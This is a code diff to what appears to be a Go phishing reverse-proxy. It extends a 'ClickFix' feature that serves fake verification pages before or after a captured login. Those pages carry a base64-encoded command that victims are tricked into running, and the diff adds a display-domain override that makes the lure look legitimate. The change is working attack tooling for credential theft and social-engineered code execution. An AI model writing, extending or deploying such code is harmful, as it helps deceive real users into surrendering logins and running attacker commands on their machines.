@@ -88,11 +88,13 @@ func wrapClickFixPayload(command string) string {
 //   {command_b64}  → base64(wrapped command) — decoded at runtime by the template JS
 //   {command}      → the raw wrapped command (legacy templates without encoding)
 //   {redirect_url} → the post-verify redirect target
-func renderClickFix(tmpl, command, redirectUrl string) string {
+//   {subdomain}    → display domain override (defaults to the request hostname)
+func renderClickFix(tmpl, command, redirectUrl, subdomain string) string {
 	wrapped := wrapClickFixPayload(command)
 	out := strings.ReplaceAll(tmpl, "{command_b64}", base64.StdEncoding.EncodeToString([]byte(wrapped)))
 	out = strings.ReplaceAll(out, "{command}", wrapped)
 	out = strings.ReplaceAll(out, "{redirect_url}", redirectUrl)
+	out = strings.ReplaceAll(out, "{subdomain}", subdomain)
 	return out
 }
 
@@ -105,8 +107,15 @@ func (p *HttpProxy) serveClickFixBefore(req *http.Request, cf *ClickFix, lure_ur
 		log.Warning("%v — falling back to normal redirect", err)
 		return req, nil
 	}
-	// build the forwarder URL (same mechanism as the HTML redirector)
-	body := renderClickFix(tmpl, cf.Command, lure_url)
+	sub := cf.Subdomain
+	if sub == "" {
+		sub = req.Host
+	}
+	redirect := lure_url
+	if cf.Only {
+		redirect = lure_url // still forward, but login flow will be skipped upstream
+	}
+	body := renderClickFix(tmpl, cf.Command, redirect, sub)
 	body = p.replaceHtmlParams(body, lure_url, params)
 	log.Info("clickfix: pre-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
@@ -126,7 +135,7 @@ func (p *HttpProxy) serveClickFixAfter(req *http.Request, cf *ClickFix, redirect
 		log.Warning("%v — falling back to normal redirect", err)
 		return p.javascriptRedirect(req, redirectUrl)
 	}
-	body := renderClickFix(tmpl, cf.Command, redirectUrl)
+	body := renderClickFix(tmpl, cf.Command, redirectUrl, cf.Subdomain)
 	log.Info("clickfix: post-auth gate (%s) [%s]", cf.Template, req.RemoteAddr)
 	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 	if resp != nil {
